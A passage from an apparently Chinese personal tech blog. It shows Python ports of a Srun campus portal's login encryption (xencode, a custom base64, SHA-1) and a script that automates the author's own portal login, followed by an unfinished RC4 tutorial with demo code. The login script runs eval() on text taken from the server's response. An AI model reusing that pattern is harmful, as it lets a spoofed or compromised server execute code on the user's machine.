= <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里也得感谢这位大佬将这个js转成了python脚本，我就直接贴结果了,里面还有一个很明显的base64，这里我也不自己写了，直接贴吧哈哈哈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span class="number">1</span>]</span><br><span class="line">            m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">            m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">            m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            pwd[p] = pwd[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>)</span><br><span class="line">            z = pwd[p]</span><br><span class="line">            p = p + <span class="number">1</span></span><br><span class="line">        y = pwd[<span class="number">0</span>]</span><br><span class="line">        m = z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span></span><br><span class="line">        m = m + ((y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>) ^ (d ^ y))</span><br><span class="line">        m = m + (pwdk[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        pwd[n] = pwd[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>)</span><br><span class="line">        z = pwd[n]</span><br><span class="line">        q = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lencode(pwd, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_base64.py</span></span><br><span class="line">_PADCHAR = <span class="string">&quot;=&quot;</span></span><br><span class="line">_ALPHA = <span class="string">&quot;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_getbyte</span>(<span class="params">s, i</span>):</span></span><br><span class="line">    <span class="comment">#print(s,&#x27; &#x27;,i)</span></span><br><span class="line">    x = <span class="built_in">ord</span>(s[i]);</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">255</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;INVALID_CHARACTER_ERR: DOM Exception 5&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    b10=<span class="number">0</span></span><br><span class="line">    x = []</span><br><span class="line">    imax = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s) % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,imax,<span class="number">3</span>):</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>) | _getbyte(s, i + <span class="number">2</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)]);</span><br><span class="line">        x.append(_ALPHA[(b10 &amp; <span class="number">63</span>)])</span><br><span class="line">    i=imax</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) - imax ==<span class="number">1</span>:</span><br><span class="line">        b10 = _getbyte(s, i) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _PADCHAR + _PADCHAR);</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(s) - imax == <span class="number">2</span>:</span><br><span class="line">        b10 = (_getbyte(s, i) &lt;&lt; <span class="number">16</span>) | (_getbyte(s, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        x.append(_ALPHA[(b10 &gt;&gt; <span class="number">18</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>)] + _ALPHA[((b10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>)] + _PADCHAR);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(x)</span><br></pre></td></tr></table></figure><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_sha1.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sha1</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(value.encode()).hexdigest()</span><br></pre></td></tr></table></figure><p>逻辑这么分析到位了之后接下来就开始写两次抓包的脚本吧，这里也直接给了，毕竟逻辑就真的这么点，主要的工作量都在js转python上面，而已经有人转好了我就直接拿过来用了，这里再次鸣谢huxiaofan1223大佬，本篇博客也贴在上面的传送门当中了。</p><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">    chkstr = token+username</span><br><span class="line">    chkstr += token+hmd5</span><br><span class="line">    chkstr += token+ac_id</span><br><span class="line">    chkstr += token+ip</span><br><span class="line">    chkstr += token+n</span><br><span class="line">    chkstr += token+<span class="built_in">type</span></span><br><span class="line">    chkstr += token+i</span><br><span class="line">    <span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">    info_temp=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line">        <span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">    &#125;</span><br><span class="line">    i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">    i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    init_res=requests.get(init_url,headers=header)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;初始化获取ip&quot;</span>)</span><br><span class="line">    <span class="comment">#print(init_res.text)</span></span><br><span class="line">    ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    <span class="comment"># print(&quot;获取token&quot;)</span></span><br><span class="line">    <span class="keyword">global</span> token</span><br><span class="line">    get_challenge_params=&#123;</span><br><span class="line">        <span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">    token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;token为:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line">    <span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">    i=get_info()</span><br><span class="line">    i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">    hmd5=get_md5(password,token)</span><br><span class="line">    chksum=get_sha1(get_chksum())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;所有加密工作已完成&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    srun_portal_params=&#123;</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line">    <span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line">    <span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line">    <span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">    srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#输出错误信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> username,password</span><br><span class="line">    username=<span class="string">&quot;&quot;</span><span class="comment">#你的用户名和密码，注意加上@cmcc(移动) 或者@chinanet(电信)，联通是啥就忘了。。</span></span><br><span class="line">    password=<span class="string">&quot;&quot;</span></span><br><span class="line">    init_getip()</span><br><span class="line">    get_token()</span><br><span class="line">    do_complex_work()</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure><p>本学生来自嘉兴学院，同校校友可以换上自己的用户名和密码直接用，如果不是的话把url替换一下应该问题也不大。</p><p>以后上网终于不用再输用户名密码了，只能说爽(狗头</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RC4加密的学习</title>
      <link href="/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4</p><span id="more"></span><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>我初识RC4是在国赛，记得很清楚的一点就是不停地取模256，那题当时靠着网上资料勉强算过去了。但是还是想系统地学一下，网上教程千篇一律，我决定自己模拟一边它的算法过程然后再理解一遍。</p><p>既然是加密，脱离不了三个概念，明文，密文，密钥。RC4是对称加密，我也才知道，一直以为是不可逆的那种hash加密，所以既然它是对称加密，那么对于加密和解密过程，他们所用的密钥相同。它生成密钥的过程如下：</p><p>生成密钥需要一个长度不多于256长度的字符串作为种子生成随机密钥，这是我自己的理解，因为它确实给我的感觉就是这样的随机。它初始生成了一个长度为256的S串，初始S[i]=i，后面根据用字符串种子作为一个变换规则T，交换S密钥里的各个值，这样的交换好处在于我们可以保证S串密钥为一个双射（满足单射和满射，这个概念高中应该讲过，不赘述）。然后给的一个字符串种子呢，就会被放进T中，T的长度也为256，如果所给字符串种子长度小于256，则会进行轮换，直到它长度严格等于256为止。举个例子，在RC4加密中，如果我给定字符串种子为abcd，那么T的值将是[‘a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,……’a’,’b’,’c’,’d’]，对于任意0&lt;=i&lt;256，</p><p>T[i]=Seed[i%len(Seed)]</p><p>那么有了这个T之后呢，我们可以开始进行密钥变换了，做以下规则的变换(字符串均转成ASCII码计算)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>从这一步我们也可以看出来，S初值我们都是知道的，T在确定了字符串种子之后也是确定的，那么由此可以算出密钥S。我们平时习惯说那个字符串是密钥，但是从这里可以看出来，字符串只是用来确定密钥的，因为在这之后，T和给的字符串已经都用不到了。所以这也是我为什么说那个字符串是种子而不是密钥，因为它没有参与加密的运算，我们刚刚算的那么快乐压根都没有出现明文这种，没有明文怎么能算加密呢对吧。</p><p>最后我们看看它是如何加密的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>有木有感觉很熟悉，跟前面生成密钥的算法差不多。这个算法如果不了解RC4，直接逆上去的话，怕能直接破防。我有体会我给你们演示一遍，首先i初值知道，c[k]知道，然后要算明文的话m[k]=c[k]^S[(S[i]+S[j])%256]然后呢，i最终值不知道，j最终值不知道，就，时间静止了呗。但是其实它最后就做一个异或，就不用管它了呗，跟它一样从头往后再异或一遍，不就回来了吗。这也就是它为什么也叫对称加密，它不仅密钥用的是一个，加密解密算法都是一样的，没错，加密即解密。RC4解密只需要对密文再加密一次就可以得到明文了。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> 